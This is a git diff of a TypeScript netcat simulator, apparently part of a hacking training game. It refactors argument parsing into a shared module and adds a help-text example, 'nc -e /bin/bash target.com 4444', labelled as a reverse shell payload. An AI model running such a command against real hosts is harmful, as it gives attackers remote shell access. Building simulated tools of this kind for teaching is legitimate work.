@@ -1,7 +1,9 @@
 // ── shells/nc/NcSession.ts ────────────────────────────────────────
 // Implementación modular del shell Netcat (nc)
+// Parseo en ./ncArgs.ts (compartido con tools/nc).
 
 import type { ShellSession, ShellContext, ShellResult } from '../ShellSession';
+import { parseNcListener, parseNcConnect, resolveNcConnect } from './ncArgs';
 
 // ── Estado del shell NC ───────────────────────────────────────────
 export interface NcState {
@@ -11,43 +13,7 @@ export interface NcState {
 }
 
 // ── Helper para parsear argumentos de listener ────────────────────
-function parseListenerMode(args: string[]): { isListener: boolean; port?: number; error?: string } {
-  const hasListener = args.some(arg => arg === '-l' || (arg.startsWith('-') && arg.includes('l')));
-  if (!hasListener) return { isListener: false };
-
-  let port: string | undefined;
-
-  // Búsqueda 1: después de -p
-  const pIdx = args.findIndex(arg => arg === '-p');
-  if (pIdx >= 0 && pIdx + 1 < args.length) {
-    port = args[pIdx + 1];
-  }
-
-  // Búsqueda 2: último argumento numérico
-  if (!port) {
-    for (let i = args.length - 1; i >= 0; i--) {
-      if (!args[i].startsWith('-') && !isNaN(Number(args[i]))) {
-        port = args[i];
-        break;
-      }
-    }
-  }
-
-  if (!port) {
-    return { isListener: true, error: 'nc: missing port specification' };
-  }
-
-  if (isNaN(Number(port))) {
-    return { isListener: true, error: 'nc: bad port number' };
-  }
-
-  const portNum = Number(port);
-  if (portNum < 1 || portNum > 65535) {
-    return { isListener: true, error: `nc: port ${port} out of range` };
-  }
-
-  return { isListener: true, port: portNum };
-}
+// (movido a ./ncArgs.ts — fuente única compartida con tools/nc)
 
 // ── Implementación del shell NC ───────────────────────────────────
 export const ncSession: ShellSession<NcState> = {
@@ -81,6 +47,7 @@ Examples:
   nc -nlvp 4444           Listen on port 4444 (common for reverse shells)
   nc -lvnp 4444           (same, different order)
   nc target.com 80        Connect to target.com on port 80
+  nc -e /bin/bash target.com 4444   Reverse shell payload
   nc -l -p 9999           Listen on port 9999 (without verbose)`,
           closeSession: true,
         },
@@ -89,7 +56,7 @@ Examples:
     }
 
     // Parsear modo listener
-    const listenerResult = parseListenerMode(parts);
+    const listenerResult = parseNcListener(parts);
 
     if (listenerResult.isListener) {
       if (listenerResult.error) {
@@ -115,30 +82,14 @@ Examples:
       };
     }
 
-    // Modo conexión
-    if (parts.length >= 2 && !parts[0].startsWith('-')) {
-      const hostname = parts[0];
-      const port = parts[1];
-
-      if (isNaN(Number(port))) {
-        return {
-          result: { output: `nc: bad port number`, isError: true, closeSession: true },
-          newState: state,
-        };
-      }
-
-      return {
-        result: {
-          output: `(UNKNOWN) [${hostname}] ${port} (?) : Connection refused`,
-          isError: true,
-          closeSession: true,
-        },
-        newState: state,
-      };
-    }
-
+    // Modo conexión: el estado del puerto virtual manda
+    const outcome = resolveNcConnect(parseNcConnect(parts), _ctx);
     return {
-      result: { output: `nc: missing arguments`, isError: true, closeSession: true },
+      result: {
+        output: outcome.output,
+        isError: outcome.isError ? true : undefined,
+        closeSession: true,
+      },
       newState: state,
     };
   },
